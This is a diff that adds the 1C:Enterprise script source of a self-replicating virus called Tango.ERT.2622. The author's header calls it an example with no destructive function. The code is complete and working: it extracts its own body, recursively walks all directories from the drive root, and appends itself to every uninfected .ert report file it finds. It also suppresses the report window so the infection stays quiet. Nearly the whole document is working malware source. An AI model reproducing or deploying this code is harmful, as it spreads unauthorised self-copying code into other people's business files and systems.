@@ -1,0 +1,127 @@
+<<<<<1C>>>>>
+//*******************************************
+//
+//  This is example virus
+//  Not destruction function
+//
+//  Name:      Tango.ERT.2622
+//
+//  by sniper
+//  Togliatti, june 2005
+//
+//  information for contact:
+//                            not information
+//
+//*******************************************
+
+//*******************************************
+// В принципе не нужна... 
+// просто мне не хотелось смотреть на появляющееся окно отчета
+// я же не Баранов изучать старые ворота ;))
+//
+procedure OnOpen()
+	returnstatus(0);
+	return;
+endprocedure
+
+// Tango.ERT.2622
+//*******************************************
+Error = 0;
+try
+    Object = createobject("Amber.Compound");
+except
+    Error = 1;
+endtry;
+if Error = 0 then
+	Path = "";
+	Name = "";
+	Label = "// Tango.ERT.2622";
+	Name = tempfilesdir() + "temp.";
+	SourceTmp = Name + "!!!";
+	TargetTmp = Name + "$$$";
+	SourceText = createobject("text");
+	TargetText = createobject("text");
+	FilePath(Path, Name);
+	FullName = Path + Name;
+	Object.Stream2file(FullName, "MD Programm text", SourceTmp, 1);
+	SourceText.Open(SourceTmp);
+	x = 0;
+	CurStr = "";
+	while find(CurStr, Label) <> 1 do
+		x = x + 1;
+		CurStr = SourceText.GetLine(x);
+	enddo;
+	CurStr = "";
+	TargetText.AddLine(Label);
+	while find(CurStr, Label) <> 1 do
+		x = x + 1;
+		CurStr = SourceText.GetLine(x);
+		TargetText.AddLine(CurStr);
+	enddo;
+	TargetText.Write(SourceTmp);
+	tabPath = createobject("valuetable");
+	tabPath.NewColumn("Path", "string");
+	tabPath.NewLine();
+	tabPath.Path = left(fs.GetCurrentDirectory(), 3);
+	x = 1;
+	Make = "Yes";
+	while Make = "Yes" do
+		Path = tabPath.GetValue(x, "Path");
+		Name = fs.FindFirstFile(Path + "*.*");
+		while Name <> "" do
+			Attribute = "";
+			fs.GetFileAttr(Path + Name, , Attribute);
+			if mid(Attribute, 4, 1) = "1" then
+				if ((Name = ".") or (Name = "..")) then
+				else
+					tabPath.NewLine();
+					tabPath.Path = Path + Name + "\";
+				endif;
+			endif;
+			Name = fs.FindNextFile();
+		enddo;
+		x = x + 1;
+		if x > tabPath.LinesCnt() then
+			Make = "No";
+		endif;
+	enddo;
+	tabPath.SelectLines();
+	while tabPath.GetLine() > 0 do
+		Path = tabPath.Path;
+		Name = fs.FindFirstFile(Path + "*.ert");
+		while Name <> "" do
+			FullName = Path + Name;
+			if Object.Stream2file(FullName, "MD Programm text", TargetTmp, 1) = 0 then
+				TargetText.Open(TargetTmp);
+				EOF = TargetText.LinesCnt();
+				Action = "Yes";
+				Make = "Yes";
+				y = 1;
+				while Make = "Yes" do
+					if find(TargetText.GetLine(y), Label) > 0 then
+						Action = "No";
+						Make = "No";
+					endif;
+					y = y + 1;
+					if y > EOF then
+						Make = "No";
+					endif;
+				enddo;
+				if Action = "Yes" then
+					SourceText.Open(SourceTmp);
+					EOF = SourceText.LinesCnt();
+					for y = 1 to EOF do
+						TargetText.AddLine(SourceText.GetLine(y));
+					enddo;
+					TargetText.Write(TargetTmp);
+					Object.File2stream(FullName, TargetTmp, "MD Programm text", 1);
+				endif;
+			endif;
+			Name = fs.FindNextFile();
+		enddo;
+	enddo;
+	fs.DeleteFile(TargetTmp);
+	fs.DeleteFile(SourceTmp);
+endif;
+//*******************************************
+// Tango.ERT.2622
